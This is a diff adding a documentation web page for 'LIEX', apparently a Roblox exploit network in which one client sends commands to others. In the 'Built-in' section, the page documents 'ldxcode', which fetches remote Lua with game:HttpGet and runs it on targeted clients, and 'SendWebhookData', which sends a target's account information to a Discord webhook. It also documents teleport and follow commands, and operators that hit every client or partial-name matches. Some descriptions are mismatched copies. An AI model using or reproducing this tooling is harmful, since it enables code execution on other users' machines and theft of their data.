@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Get Started</title>
+<link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/lua.min.js"></script>
+<link rel="stylesheet" href="./modules/css.css">
+<style>
+*{
+    scroll-behavior: smooth;    
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial;
+}
+::-webkit-scrollbar{
+    scroll-behavior: smooth;
+    width: 5px;
+    background: none;
+}
+::-webkit-scrollbar-thumb{
+    border-radius: 100px;
+    background-color: rgb(255, 255, 255);
+}
+body{
+    width:100%;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:#080808;
+    overflow:hidden;
+    position:relative;
+}
+.item{
+    margin-bottom: 70px;
+}
+.circle{
+    position:absolute;
+    border-radius:50%;
+    background:rgba(0, 0, 0, 0.158);
+    transition: 5s all ease-out;
+}
+.circle1{
+    width:150px;
+    height:150px;
+    bottom:-100px;
+    right:-100px;
+}
+.circle2{
+    width:100px;
+    height:100px;
+    bottom:-50px;
+    right:-50px;
+}
+#content{
+    margin-top: 5%;
+    padding: 20px 20px;
+    position: relative;
+    width: 100%;
+    height: 90%;
+}
+.circle3{
+    width:50px;
+    height:50px;
+    bottom:-200px;
+    right:-2000px;
+}
+.line{
+    position:absolute;
+    width:101%;
+    height:2px;
+    background:rgba(194, 194, 194, 0.342);
+}
+.line1{
+    top:25%;
+}
+.line2{
+    top:75%;
+}
+.container{
+    text-align:center;
+    z-index:2;
+}
+@keyframes intro {
+    0%{
+        top: 100px;
+        opacity: 0;
+    }
+    50%{
+        opacity: 0.2;
+    }
+    100%{
+        top: 0px;
+        opacity: 1;
+    }
+}
+h1{
+    color:rgb(241, 232, 148);
+    font-size:60px;
+    margin-bottom:15px;
+    transition: all 0.5s ease;
+    position: relative;
+    animation: ease-out 0.4s intro;
+}
+.copyButton{
+    position: absolute;
+    right: 5px;
+    background: none;
+    border: 1px solid white;
+    padding: 5px 5px;
+    color: white;
+    border-radius: 10px;
+}
+h2{
+    color:white;
+    transition: all 0.5s ease;
+    position: relative;
+    animation: ease-out 0.4s intro;
+}
+pre{
+    transition: all 0.5s ease;
+    position: relative;
+    padding: 5px 5px;
+    animation: ease-out 0.4s intro;
+    background-color: rgba(0, 0, 0, 0.678);
+    border-radius: 10px;
+    border: 1px solid white;
+}
+code{
+    margin-top: 5px;
+}
+p{
+    color:rgba(255,255,255,0.6);
+    margin-bottom:25px;
+    font-size:15px;
+    position: relative;
+    animation: ease-out 0.4s intro;
+}
+
+.hide{
+    display: none;
+}
+.sidebar{
+    transition: 0.3s all ease-in;
+    position: absolute;
+    left: 0px;
+    width: 20dvw;
+    height: 100%;
+    z-index: 0;
+    left: -20.5dvw;
+    border-right: 2px solid rgb(54, 54, 54);
+    background-color: rgb(10, 10, 10);
+}
+.sidebar button{
+    width:95%;
+    height:55px;
+    position: relative;
+    border-radius:12px;
+    background:rgb(7, 7, 7);
+    border: 2px solid rgb(255, 255, 255);
+    color:white;
+    font-size:18px;
+    cursor:pointer;
+    transition:0.2s;
+    animation: ease-out 1.2s intro;
+}
+.sidebar button:hover{
+    opacity:0.8;
+}
+.show-side{
+    left: 0dvw;
+}
+@media (max-width:420px) {
+    .sidebar{
+        width: 240px;
+    }
+}
+table, th, td {
+    border: 2px solid rgb(255, 255, 255);
+    color: white;
+    border-radius: 10px;
+}
+</style>
+<style>
+    .justify-center{
+        display: flex;
+        justify-content: center;
+    }
+    h1 {
+        font-size: 28px;
+    }
+    .page{
+        height: 90%;
+        scroll-snap-type: y mandatory;
+        overflow-y: auto;
+    }
+</style>
+<!--language-->
+<style>
+    .function{
+        color: rgb(215, 156, 255);
+    }
+    .hljs-string{
+        color: rgb(152, 253, 138);
+    }
+    .hljs-params{
+        color: rgb(255, 255, 152);
+    }
+    .hljs-built_in {
+        color: rgb(112, 179, 255);
+    }
+    .hljs-comment {
+        color: rgb(117, 117, 117);
+    }
+    .internal {
+        color: rgb(255, 107, 107);
+    }
+    .expl{
+        color: rgba(255, 255, 255, 0.76);
+        font-size: 22px;
+    }
+    .hljs{
+    background: none !important;
+    }
+    ::selection{
+        background-color: rgb(118, 44, 255);
+    }
+</style>
+</head>
+<body>
+
+    <div class="line line1" style="top:60px;position: absolute;">
+        <div id="menu-button" style="position: relative;margin-left: 20px;margin-top: -50px;">
+            <svg fill="#ffffff" height="40px" width="40px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 297 297" xml:space="preserve" stroke="#ffffff">
+                <g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g> <g> <g> <path d="M279.368,24.726H102.992c-9.722,0-17.632,7.91-17.632,17.632V67.92c0,9.722,7.91,17.632,17.632,17.632h176.376 c9.722,0,17.632-7.91,17.632-17.632V42.358C297,32.636,289.09,24.726,279.368,24.726z"></path> <path d="M279.368,118.087H102.992c-9.722,0-17.632,7.91-17.632,17.632v25.562c0,9.722,7.91,17.632,17.632,17.632h176.376 c9.722,0,17.632-7.91,17.632-17.632v-25.562C297,125.997,289.09,118.087,279.368,118.087z"></path> 
+                <path d="M279.368,211.448H102.992c-9.722,0-17.632,7.91-17.632,17.633v25.561c0,9.722,7.91,17.632,17.632,17.632h176.376 c9.722,0,17.632-7.91,17.632-17.632v-25.561C297,219.358,289.09,211.448,279.368,211.448z"></path> <path d="M45.965,24.726H17.632C7.91,24.726,0,32.636,0,42.358V67.92c0,9.722,7.91,17.632,17.632,17.632h28.333 c9.722,0,17.632-7.91,17.632-17.632V42.358C63.597,32.636,55.687,24.726,45.965,24.726z"></path> 
+                    <path d="M45.965,118.087H17.632C7.91,118.087,0,125.997,0,135.719v25.562c0,9.722,7.91,17.632,17.632,17.632h28.333 c9.722,0,17.632-7.91,17.632-17.632v-25.562C63.597,125.997,55.687,118.087,45.965,118.087z"></path> <path d="M45.965,211.448H17.632C7.91,211.448,0,219.358,0,229.081v25.561c0,9.722,7.91,17.632,17.632,17.632h28.333 c9.722,0,17.632-7.91,17.632-17.632v-25.561C63.597,219.358,55.687,211.448,45.965,211.448z"></path> </g> </g> </g> 
+                </g>
+            </svg>
+        </div>
+    </div>
+    <div id="content">
+        <div id="Socket" class="page hide"></div>
+        <div id="Builtin" class="page hide"></div>
+        <div id="opr" class="page hide"></div>
+        <div id="Server" class="page hide"></div>
+    </div>
+    <div class="sidebar flex-column" style="align-items: center;" id="sidebar">
+        <button style="margin-top: 10px;margin-bottom: -0px;width: 25px; height: 25px;position: absolute;right: 0px;text-align: center;background: none;border: none;" onclick="menu()">X</button>
+        <h2 style="color: white; text-align: center;margin-top: 30px;">LIEX Documentation</h2>
+        <button style="margin-top: 10px;" onclick="show('Socket')">Socket</button>
+        <button style="margin-top: 10px;" onclick="show('Builtin')">Built-in</button>
+        <button style="margin-top: 10px;" onclick="show('opr')">Operator</button>
+        <button style="margin-top: 10px;" onclick="show('Server')">Server</button>
+        
+    </div>
+    <script>
+        document.querySelectorAll(".circle").forEach(self =>{
+
+            self.style.left = Math.floor(Math.random() * 90) + "%"
+            self.style.top = Math.floor(Math.random() * 70) + "%"
+        })
+        setTimeout(()=>{
+            document.querySelectorAll(".circle").forEach(self =>{
+
+            self.style.left = Math.floor(Math.random() * 90) + "%"
+            self.style.top = Math.floor(Math.random() * 70) + "%"
+        })
+        },500)
+        let time = 0.07
+        document.querySelectorAll(".circle").forEach(self =>{
+            
+            setTimeout(() => {
+                setInterval(()=>{
+                    self.style.left = Math.floor(Math.random() * 90) + "%"
+                    self.style.top = Math.floor(Math.random() * 90) + "%"
+                },4500)
+            }, time * 1000);
+            time += 0.4
+        })
+    </script>
+    <script src="./modules/js.js"></script>
+    <!--UI UX-->
+    <script>
+        let sidebar = getId("sidebar")
+        function menu(){
+            sidebar.classList.toggle("show-side")
+        }
+        getId("menu-button").onclick = ()=>{
+            print("men")
+            menu()
+        }
+        function show(str){
+        menu()
+    document.querySelectorAll(".page").forEach(el=>{
+        el.classList.add("hide")
+    })
+        console.log(str)
+
+        const f = document.getElementById(str.toString())
+        console.log(f)
+        setTimeout(()=>{f.classList.remove("hide")},10)
+    }
+
+    console.log(getId("Socket"))
+        /*
+        Temp
+        & = func
+        # = str
+        $ = var/tbl
+        % = bool/num/nil
+        let var1 = {
+            name: "Socket.new",
+            returnv: "void",
+            desc:"this function used to create a new remote socket",
+            example:"&Socket.new(&$name:$ #String#,$callback:$ &function&)"
+        }
+        */
+        function createDoc(parent,tbl){
+            let name = tbl.name
+            let desc = tbl.desc
+
+            let used = tbl.use 
+
+            let exmp = tbl.example.toString()
+            console.log(exmp)
+            parent.innerHTML += `<div class="item">
+                <h1>${name}</h1>
+                <h2 class="expl">${used}</h2>
+                <p>${desc}</p>
+                <pre style="font-size:15px;" class="language-lua"><button onclick="copyCode(this)" class="copyButton">Copy</button><code>${exmp}</code></pre>
+            </div>`
+        }
+        let var1 = {
+            name: "Socket.new",
+            use: "Socket.new(name: String,callback: Function): RemoteSocket",
+            returnv: "void",
+            desc:"this function used to create a new remote socket",
+            example:`Socket.new("ping",function(id,...)
+    print(id,...) 
+end)`
+        }
+        let sockets = {
+            [1]:{
+                name: "Socket.new",
+                use: "Socket.new(name: String,callback: Function): RemoteSocket",
+                returnv: "void",
+                desc:"this function used to create a new remote socket",
+                example:`Socket.new("ping",function(id,...)
+    print(id,...)
+end)`},
+            [2]:{
+                name: "Socket:CloseSession()",
+                use: "Socket:CloseSession(): void",
+                desc:"this function will disconnected you from your current socket",
+                example:`--Connect code
+Socket:CloseSession()--it will close your socket`
+            },
+            [3]:{
+                name: "RemoteSocket:FireSocket()",
+                use: "RemoteSocket:FireSocket(op: String,...): void",
+                desc:"this function will disconnected you from your current socket",
+                example:`chat:FireSocket("@all","hello world")--[[chat is a built-in remote of liex 
+that can be use to send chat]]`
+            },
+            [4]:{
+                name: "Socket:GetSocket()",
+                use: "Socket:GetSocket(name: String): RemoteSocket",
+                desc:"return Remote Socket table that can be modified",
+                example:`for i,v in pairs(Socket:GetSocket("chat")) do
+    print(i,v)
+end`
+            },
+            [5]:{
+                name: "Socket:GetSockets()",
+                use: "Socket:GetSockets(): table",
+                returnv: "void",
+                desc:"return list of remote socket that currently exist in liex",
+                example:`for i,v in pairs(Socket:GetSockets()) do
+    print(i,v)
+end`
+            }
+        }
+        let Builtin = {
+            [1]:{
+                name: "chat",
+                use: "chat:FireSocket(op,...)",
+                returnv: "void",
+                desc:"this remote used to send chat to other client",
+                example:`chat:FireSocket("@all","hello world")`},
+            [2]:{
+                name: "ldxcode",
+                use: "ldxcode:FireSocket(op,code: String)",
+                desc:"this remote will send a code to your target client and execute it",
+                example:`ldxcode:FireSocket("@all",[[loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()]]
+--or just args game:HttpGet(url) because i use loadstring to run it`
+            },
+            [3]:{
+                name: "Bring",
+                use: "Bring:FireSocket(op,target: String): void",
+                desc:"this remote will make your target client(op) teleport to your target player (even if the target player isnt in our socket)",
+                example:`Bring:FireSocket("@all","@Guest01")`
+            },
+            [4]:{
+                name: "SendWebhookData",
+                use: "SendWebhookData:FireSocket(op,url: String)",
+                desc:"Send basic account information about your client(such as what game he play rn)",
+                example:`SendWebhookData:FireSocket("@all","https://www.discord.com/somewebhookurlhere32151")`
+            },
+            [5]:{
+                name: "followtarget",
+                use: "followtarget:FireSocket(op,type: String)",
+                desc:"make your target client following some one\ntype:['follow','attach']",
+                example:`followtarget:FireSocket("@all","@Agusvernandus")`
+            }
+        }
+        let opr = {
+            [1]:{
+                name: "@all",
+                use: "@all or @global (in op only)",
+                desc:"used for invoking all client",
+                example:`chat:FireSocket("@all","hello world"))`
+            },
+            [2]:{
+                name: "@self",
+                use: "@self",
+                desc:"this remote will send a code to your target client and execute it",
+                example:`chat:FireSocket("@self","hello world"))`
+            },
+            [3]:{
+                name: "@name",
+                use: "@yourusername",
+                desc:"this one used for invoking specific client",
+                example:`chat:FireSocket("@self","hello world"))`
+            },
+            [4]:{
+                name: "$name",
+                use: "$partialName",
+                desc:"this op similar with @name but the name dosent have to be exactly same just take some letter of their name",
+                example:`SendWebhookData:FireSocket("$atps","https://www.discord.com/somewebhookurlhere32151")`
+            },
+            [5]:{
+                name: "@server",
+                use: "@server (can works in global but need to be filtered)",
+                desc:"this used to invoking client only in their current server and not invoking other in another game or server for now it still WIP",
+                example:`chat:FireSocket("@server","@Agusvernandus")`
+            }
+        }
+        function copyCode(el){
+            let code = el.parentElement.querySelector("code")
+            navigator.clipboard.writeText(code.textContent)
+            el.textContent = "Copied"
+            setTimeout(()=>{
+                el.textContent = "Copy"
+            },5000)
+            
+        }
+        function copyCode(el){
+            let code = el.parentElement.querySelector("code")
+            navigator.clipboard.writeText(code.textContent)
+            el.textContent = "Copied"
+            setTimeout(()=>{
+                el.textContent = "Copy"
+            },5000)
+            
+        }
+        
+        Object.values(sockets).forEach(v=>{
+            createDoc(getId("Socket"), v)
+        })
+        Object.values(Builtin).forEach(v=>{
+            createDoc(getId("Builtin"), v)
+        })
+        Object.values(opr).forEach(v=>{
+            createDoc(getId("opr"), v)
+        })
+        hljs.highlightAll()
+        menu()
+        show("Socket")
+    </script>
+</body>
+</html>
